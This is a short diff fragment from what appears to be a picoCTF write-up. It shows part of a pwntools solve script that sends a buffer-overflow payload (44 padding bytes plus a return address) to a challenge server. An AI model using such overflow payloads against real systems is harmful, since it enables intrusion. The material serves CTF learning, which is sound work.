@@ -160,7 +160,7 @@ So to put that into a python script with pwntools:
 # solve.py
 from pwn import *
 
-payload = b"A" * 44 + p32(0x80491f6)
+payload = b"A" * 44 + p32(0x80491f6)
 target = remote('saturn.picoctf.net', 61303)
 
 log.info(target.recvline())
